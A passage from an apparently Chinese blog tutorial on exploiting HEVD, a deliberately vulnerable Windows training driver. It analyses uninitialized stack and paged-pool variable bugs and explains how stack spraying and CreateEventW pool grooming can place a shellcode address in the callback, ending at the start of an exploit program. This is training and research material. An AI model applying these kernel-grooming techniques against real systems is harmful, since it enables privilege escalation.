</span></span><span class="line"><span class="cl">  <span class="n">ms_exc</span><span class="p">.</span><span class="n">registration</span><span class="p">.</span><span class="n">TryLevel</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="mh">0xF0u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserValue: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UninitializedMemory Address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">UninitializedMemory</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mh">0xBAD0B0B0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">UninitializedMemory</span><span class="p">.</span><span class="n">Value</span> <span class="o">=</span> <span class="mh">0xBAD0B0B0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">UninitializedMemory</span><span class="p">.</span><span class="n">Callback</span> <span class="o">=</span> <span class="n">UninitializedMemoryStackObjectCallback</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UninitializedMemory.Value: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UninitializedMemory</span><span class="p">.</span><span class="n">Value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UninitializedMemory.Callback: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UninitializedMemory</span><span class="p">.</span><span class="n">Callback</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Triggering Uninitialized Memory in Stack</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">UninitializedMemory</span><span class="p">.</span><span class="n">Callback</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">UninitializedMemory</span><span class="p">.</span><span class="nf">Callback</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>由于<code>_UNINITIALIZED_MEMORY_STACK</code>没有初始化，所以存在利用“<strong>栈喷射</strong>”将<code>_UNINITIALIZED_MEMORY_STACK</code>结构体成员<code>Callback</code>设置为<code>shellcode</code>函数的地址</p>
<p>栈喷射：</p>
<p>Windows内核API中存在一个函数<code>NtMapUserPhysicalPages</code>，可以拷贝输入的字节到内核栈上的一个本地缓冲区。（栈喷射：<a href="https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/"target="_blank" rel="external nofollow noopener noreferrer">nt!NtMapUserPhysicalPages 和内核堆栈喷射技术</a>）</p>
<h3 id="exp未完成" class="heading-element">
  <a href="#exp%e6%9c%aa%e5%ae%8c%e6%88%90" class="heading-mark"></a>EXP(未完成)</h3><p>还是有点小问题，，</p>
<h2 id="11triggeruninitializedmemorypagedpool" class="heading-element">
  <a href="#11triggeruninitializedmemorypagedpool" class="heading-mark"></a>11.TriggerUninitializedMemoryPagedPool</h2><p>未初始化池变量</p>
<h3 id="前置" class="heading-element">
  <a href="#%e5%89%8d%e7%bd%ae" class="heading-mark"></a>前置</h3><p>Windows 下，<code>Lookaside List(后备列表)</code>提供了一个比较简单的提高小块内存分配和申请效率的机制，用来进行固定大小内存块的小内存块的动态申请和释放</p>
<p>KPCRB中有这么几个：</p>
<div class="highlight" id="id-99"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; dt _KPRCB
</span></span><span class="line"><span class="cl">ntdll!_KPRCB
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">   +0x5a0 PPLookasideList  : <span class="o">[</span>16<span class="o">]</span> _PP_LOOKASIDE_LIST
</span></span><span class="line"><span class="cl">   +0x620 PPNPagedLookasideList : <span class="o">[</span>32<span class="o">]</span> _GENERAL_LOOKASIDE_POOL
</span></span><span class="line"><span class="cl">   +0xf20 PPPagedLookasideList : <span class="o">[</span>32<span class="o">]</span> _GENERAL_LOOKASIDE_POOL
</span></span><span class="line"><span class="cl">...</span></span></code></pre></div><p>每一个 <code>GENERAL_LOOKASIDE</code> 都是一条 <code>Lookaside List</code>，所有的 <code>GENERAL_LOOKASIDE</code> 用双向链表串起来，</p>
<p><code>Lookaside List</code>就是一个控制结构头和一个由相同大小的内存块构成的单链表组成，控制结构中，记录着当前后备列表的深度和最大深度</p>
<blockquote>
<p>在通过<code>ExAllocateFrom(N)PagedLookasideList</code>申请内存的时候，如果单链表不为空，那么就从头部摘出一块返回，否则使用<code>ExAllocatePoolWithTag</code>或者在初始化后备列表时提供的分配函数申请一个内存块返回给用户；在通过<code>ExFreeTo(N)PagedLookasideList</code>释放之前申请的内存块时，如果后备列表当前的深度没有超过最大深度，那么插入到内存块头部，否则使用<code>ExFreePoolWithTag</code>或在初始化后备列表时提供的释放函数释放内存块。</p>
</blockquote>
<div class="highlight" id="id-100"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//0x48 bytes (sizeof)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">_GENERAL_LOOKASIDE_POOL</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">union</span> <span class="n">_SLIST_HEADER</span> <span class="n">ListHead</span><span class="p">;</span>                                       <span class="c1">//0x0//内存链表
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">struct</span> <span class="n">_SINGLE_LIST_ENTRY</span> <span class="n">SingleListHead</span><span class="p">;</span>                           <span class="c1">//0x0//是一条具有相同大小的空闲换页池单向链表
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">USHORT</span> <span class="n">Depth</span><span class="p">;</span>                                                           <span class="c1">//0x8//当前内存列表的最大深度
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">USHORT</span> <span class="n">MaximumDepth</span><span class="p">;</span>                                                    <span class="c1">//0xa//整个look aside运行的最大深度，默认256
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">TotalAllocates</span><span class="p">;</span>                                                   <span class="c1">//0xc/总共分配了多少次内存
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG</span> <span class="n">AllocateMisses</span><span class="p">;</span>                                               <span class="c1">//0x10//分配失败的内存，通过Allocate分配
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="n">AllocateHits</span><span class="p">;</span>                                                 <span class="c1">//0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">TotalFrees</span><span class="p">;</span>                                                       <span class="c1">//0x14
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG</span> <span class="n">FreeMisses</span><span class="p">;</span>                                                   <span class="c1">//0x18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="n">FreeHits</span><span class="p">;</span>                                                     <span class="c1">//0x18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="k">enum</span> <span class="n">_POOL_TYPE</span> <span class="n">Type</span><span class="p">;</span>                                                   <span class="c1">//0x1c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">Tag</span><span class="p">;</span>                                                              <span class="c1">//0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">Size</span><span class="p">;</span>                                                             <span class="c1">//0x24
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span><span class="c1">//分配函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">VOID</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">AllocateEx</span><span class="p">)(</span><span class="k">enum</span> <span class="n">_POOL_TYPE</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">arg2</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">arg3</span><span class="p">,</span> <span class="k">struct</span> <span class="n">_LOOKASIDE_LIST_EX</span><span class="o">*</span> <span class="n">arg4</span><span class="p">);</span> <span class="c1">//0x28
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">VOID</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">Allocate</span><span class="p">)(</span><span class="k">enum</span> <span class="n">_POOL_TYPE</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">arg2</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">arg3</span><span class="p">);</span>    <span class="c1">//0x28
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span><span class="c1">//释放函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">VOID</span> <span class="p">(</span><span class="o">*</span><span class="n">FreeEx</span><span class="p">)(</span><span class="n">VOID</span><span class="o">*</span> <span class="n">arg1</span><span class="p">,</span> <span class="k">struct</span> <span class="n">_LOOKASIDE_LIST_EX</span><span class="o">*</span> <span class="n">arg2</span><span class="p">);</span>        <span class="c1">//0x2c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">VOID</span> <span class="p">(</span><span class="o">*</span><span class="n">Free</span><span class="p">)(</span><span class="n">VOID</span><span class="o">*</span> <span class="n">arg1</span><span class="p">);</span>                                           <span class="c1">//0x2c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_LIST_ENTRY</span> <span class="n">ListEntry</span><span class="p">;</span>                                           <span class="c1">//0x30//就是 GENERAL_LOOKASIDE 双向链表
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">LastTotalAllocates</span><span class="p">;</span>                                               <span class="c1">//0x38
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG</span> <span class="n">LastAllocateMisses</span><span class="p">;</span>                                           <span class="c1">//0x3c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="n">LastAllocateHits</span><span class="p">;</span>                                             <span class="c1">//0x3c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">Future</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>                                                        <span class="c1">//0x40
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span> 
</span></span></code></pre></div><p>大致是这个样子：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/3.jpg" alt="alt 3" srcset="/posts/2023-8-hevd/3.jpg?size=small, /posts/2023-8-hevd/3.jpg?size=medium 1.5x, /posts/2023-8-hevd/3.jpg?size=large 2x" data-title="alt 3" style="--width: 1047px;--aspect-ratio: 1047 / 806;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>当使用 <code>ExAllocatePoolWithTag</code> 申请一个小块内存时，系统会首先尝试从 <code>KPRCB</code> 中的 <code>PP(N)PagedLookasideList</code> 分配内存。在分配内存时，后备列表中的内存块只提供满足大小符合的申请，否则不予处理</p>
<hr>
<p>Windows 7 下的<code>Lookaside Lists</code>快表最大为0x20，最多有256个块，这里需要修改快表的结构，因为申请池一开始是使用快表，如果快表不合适才会去调用空表(ListHeads)</p>
<h3 id="漏洞分析-6" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-6" class="heading-mark"></a>漏洞分析</h3><p>申请了一块分页池，<code>UserBuffer</code>给了<code>v2</code>，判断是否等于 <code>0xBAD0B0B0</code> ，如果相等则给回调函数赋值然后执行，如果不相等则直接调用回调函数，所以要做的就是在这里写为<code>shellcode</code>的地址即可：</p>
<div class="highlight" id="id-101"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TriggerUninitializedMemoryPagedPool</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_UNINITIALIZED_MEMORY_POOL</span> <span class="o">*</span><span class="n">UninitializedMemory</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-1Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">CPPEH_RECORD</span> <span class="n">ms_exc</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">ms_exc</span><span class="p">.</span><span class="n">registration</span><span class="p">.</span><span class="n">TryLevel</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="mh">0xF0u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">UninitializedMemory</span> <span class="o">=</span> <span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">PagedPool</span><span class="p">,</span> <span class="mh">0xF0u</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">UninitializedMemory</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;PagedPool&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">240</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UninitializedMemory</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserValue: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UninitializedMemory Address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">UninitializedMemory</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mh">0xBAD0B0B0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="n">Value</span> <span class="o">=</span> <span class="mh">0xBAD0B0B0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="n">Callback</span> <span class="o">=</span> <span class="n">UninitializedMemoryPagedPoolObjectCallback</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memset</span><span class="p">(</span><span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">57</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Triggering Uninitialized Memory in PagedPool</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">UninitializedMemory</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UninitializedMemory-&gt;Value: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="n">Value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UninitializedMemory-&gt;Callback: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="n">Callback</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">UninitializedMemory</span><span class="o">-&gt;</span><span class="nf">Callback</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ms_exc</span><span class="p">.</span><span class="n">registration</span><span class="p">.</span><span class="n">TryLevel</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1073741801</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>源码中的<code>UninitializedMemory</code>结构体：</p>
<div class="highlight" id="id-102"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_UNINITIALIZED_HEAP_VARIABLE</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG_PTR</span> <span class="n">Value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">FunctionPointer</span> <span class="n">Callback</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG_PTR</span> <span class="n">Buffer</span><span class="p">[</span><span class="mi">58</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">UNINITIALIZED_HEAP_VARIABLE</span><span class="p">,</span> <span class="o">*</span><span class="n">PUNINITIALIZED_HEAP_VARIABLE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//4 + 4 + 58 * 4 + pool header = 248 &lt; 256
</span></span></span></code></pre></div><p>所以<code>UninitializedMemory</code> 属于小块内存，系统会首先尝试从 <code>PPPagedLookasideList</code> 中分配申请的换页池</p>
<p>接下来要做的就是使 <code>PPPagedLookasideList</code> 中填满脏空闲内存块，之后<code>UninitializedMemory</code> 会从<code>PPPagedLookasideList </code>中申请换页池块，发生未初始化变量调用的时候，就会执行 <code>shellcode</code> 了。</p>
<h3 id="漏洞利用-3" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8-3" class="heading-mark"></a>漏洞利用</h3><p>之前堆喷射用的函数<code>CreateEventA</code>，但是这里是分页池而不是非分页池</p>
<p>事件对象本身分配给了非分页池，但是最后一个参数<code>LPCTSTR</code>类型的<code>lpName</code>实际上是在分页池上分配的，并且可以操控</p>
<div class="highlight" id="id-103"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="nf">CreateEventA</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpEventAttributes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">BOOL</span>                  <span class="n">bManualReset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">BOOL</span>                  <span class="n">bInitialState</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">LPCSTR</span>                <span class="n">lpName</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></div><p>这里要使用<code>CreateEventW</code> 而不是 <code>CreateEventA</code>，因为地址中总会出现 00，用 <code>CreateEventA</code> 的话字符串会被截断，用 <code>CreateEventW</code> 的话要遇到 00 00 才会被截断。</p>
<p>这里还需要指定<code>lpName</code>都不相等，因为如果每个 <code>lpName</code> 都相等的话，你就算调用再多次 <code>CreateEventW</code>，到最后换页池中也只存在着一块 <code>lpName</code>（因为是字符串，只要有一份就够了），也就是说到最后 <code>PPPagedLookasideList</code> 248字节链上只会存在一块空闲换页池</p>
<p>源码中堆结构如下：</p>
<div class="highlight" id="id-104"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_UNINITIALIZED_HEAP_VARIABLE</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG_PTR</span> <span class="n">Value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">FunctionPointer</span> <span class="n">Callback</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG_PTR</span> <span class="n">Buffer</span><span class="p">[</span><span class="mi">58</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">UNINITIALIZED_HEAP_VARIABLE</span><span class="p">,</span> <span class="o">*</span><span class="n">PUNINITIALIZED_HEAP_VARIABLE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//4 + 4 + 58 * 4 + pool header = 248 &lt; 256
</span></span></span></code></pre></div><p>回调函数在+4的位置</p>
<p>需要注意的：</p>
<ul>
<li><strong>Lookaside</strong>表在系统启动2分钟之后启动，所以需要等等</li>
<li><strong>Lookaside</strong>列表的最大块大小是 0x20，它最多只能管理 256 个块，之后任何额外的块都由 ListHead<strong>管理</strong></li>
<li><code>lpName</code>不应该包含任何 NULL 字符，因为这会改变<code>lpName</code>的长度，并且漏洞利用将会失败</li>
</ul>
<p>流程：</p>
<ul>
<li>使用<code>CreateEventW</code>创建事件，其中第四个参数需要按照源码中<code>_UNINITIALIZED_HEAP_VARIABLE</code>结构体来填写：偏移为4的地方写成shellcode地址，然后保证第四个参数每个都不一样，再额外修改一点不相关的就行</li>
<li>释放申请的256个池</li>
<li>接下来与驱动交互的时候，申请出来的池就会执行shellcode。（未初始化池变量）</li>
</ul>
<h3 id="exp-5" class="heading-element">
  <a href="#exp-5" class="heading-mark"></a>EXP</h3><div class="highlight" id="id-105"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">VOID</span> <span class="nf">shellCode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">Event_OBJECT</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// char lpName[0xf0] = { 0 };
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">WCHAR</span> <span class="n">lpName</span><span class="p">[</span><span class="mh">0xf0</span> <span class="o">/</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="c1">// 一个Unicode是2个字节
